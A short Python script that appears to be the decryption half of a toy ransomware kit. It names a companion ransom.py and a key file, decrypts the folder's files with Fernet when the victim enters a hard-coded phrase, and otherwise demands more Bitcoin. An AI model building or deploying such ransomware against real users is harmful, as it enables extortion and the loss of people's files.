#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


# finding files

files = []

for file in os.listdir():
	if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

#print(files)


with open("thekey.key" , "rb") as thekey:
	secreat_key = thekey.read()

secreat_phrase = "coffee"

user_phrase = input("Enter the secreat pharase to decrypt your files :\n")

if user_phrase == secreat_phrase:

	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secreat_key).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)

	print("Your files have been decrypted , Enjoy")
else:
	print("Sorry, wrong secreat phrase. Send me more Bitcoin")


